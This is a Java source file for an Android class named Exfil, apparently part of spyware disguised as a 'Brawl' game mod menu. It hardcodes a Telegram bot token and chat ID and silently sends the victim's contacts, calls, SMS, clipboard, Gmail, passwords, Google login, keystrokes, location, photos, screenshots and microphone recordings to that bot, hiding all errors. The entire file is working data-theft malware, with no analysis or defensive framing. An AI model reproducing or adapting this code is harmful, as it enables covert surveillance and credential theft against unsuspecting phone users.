package com.brawl.modmenu;

import android.util.Base64;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exfil {
    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String CHAT  = "8558500657";

    private static String prettify(String tag, String data) {
        String icon = "📄";
        String title = tag;

        switch (tag) {
            case "DEVICE":       icon = "📱"; title = "Устройство"; break;
            case "APPS":         icon = "📦"; title = "Приложения"; break;
            case "CONTACTS":     icon = "👥"; title = "Контакты"; break;
            case "CALLS":        icon = "📞"; title = "Звонки"; break;
            case "SMS":          icon = "💬"; title = "SMS"; break;
            case "SMS_HISTORY":  icon = "📨"; title = "История SMS"; break;
            case "CLIPBOARD":    icon = "📋"; title = "Буфер обмена"; break;
            case "GMAIL_PUSH":   icon = "📧"; title = "Gmail (пуш)"; break;
            case "GMAIL_VIEW":   icon = "📩"; title = "Gmail (письмо)"; break;
            case "STEAL":        icon = "🔐"; title = "Пароли"; break;
            case "GOOGLE_LOGIN": icon = "🔑"; title = "Google аккаунт"; break;
            case "NOTIF":        icon = "🔔"; title = "Уведомление"; break;
            case "SCREEN":       icon = "📸"; title = "Скрин"; break;
            case "ROBLOX":       icon = "🎮"; title = "Roblox"; break;
            case "KEYS":         icon = "⌨️"; title = "Клавиатура"; break;
            case "CMD":          icon = "⚙️"; title = "Команда"; break;
            case "HELP":         icon = "📖"; title = "Справка"; break;
            case "INFO":         icon = "ℹ️"; title = "Инфо"; break;
            case "BATTERY":      icon = "🔋"; title = "Батарея"; break;
            case "LOCATION":     icon = "📍"; title = "Локация"; break;
            case "PHOTO":        icon = "📷"; title = "Фото"; break;
            case "MIC":          icon = "🎤"; title = "Микрофон"; break;
        }

        StringBuilder sb = new StringBuilder();
        sb.append(icon).append(" <b>").append(title).append("</b>\n");
        sb.append("━━━━━━━━━━━━━━━━━━\n");
        sb.append(escape(data));
        return sb.toString();
    }

    private static String escape(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }

    public static void send(String tag, String data) {
        new Thread(() -> {
            try {
                String payload = prettify(tag, data);
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
                String body = "chat_id=" + CHAT
                        + "&parse_mode=HTML"
                        + "&disable_web_page_preview=true"
                        + "&text=" + URLEncoder.encode(payload, "UTF-8");

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(15000);
                c.setReadTimeout(15000);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(body.getBytes("UTF-8"));
                }
                c.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    public static void sendPhoto(String tag, String b64) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendPhoto";
                String boundary = "----bnd" + System.currentTimeMillis();

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);
                c.setConnectTimeout(30000);
                c.setReadTimeout(30000);

                OutputStream out = c.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(
                        new java.io.OutputStreamWriter(out, "UTF-8"), false);

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                w.append(CHAT).append("\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                w.append("📸 ").append(tag).append(" • ")
                 .append(new java.util.Date().toString()).append("\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"photo\"; filename=\"s.jpg\"\r\n");
                w.append("Content-Type: image/jpeg\r\n\r\n");
                w.flush();

                out.write(Base64.decode(b64, Base64.DEFAULT));

                w.append("\r\n--").append(boundary).append("--\r\n");
                w.flush();
                w.close();
                c.getResponseCode();
            } catch (Throwable ignored) {}
        }).start();
    }

    public static void sendAudio(String tag, String b64, int sec) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendAudio";
                String boundary = "----bnd" + System.currentTimeMillis();

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);
                c.setConnectTimeout(60000);
                c.setReadTimeout(60000);

                OutputStream out = c.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(
                        new java.io.OutputStreamWriter(out, "UTF-8"), false);

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                w.append(CHAT).append("\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                w.append("🎤 MIC • ").append(sec).append(" сек\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"audio\"; filename=\"rec.m4a\"\r\n");
                w.append("Content-Type: audio/mp4\r\n\r\n");
                w.flush();

                out.write(Base64.decode(b64, Base64.DEFAULT));

                w.append("\r\n--").append(boundary).append("--\r\n");
                w.flush();
                w.close();
                c.getResponseCode();
            } catch (Throwable ignored) {}
        }).start();
    }
}
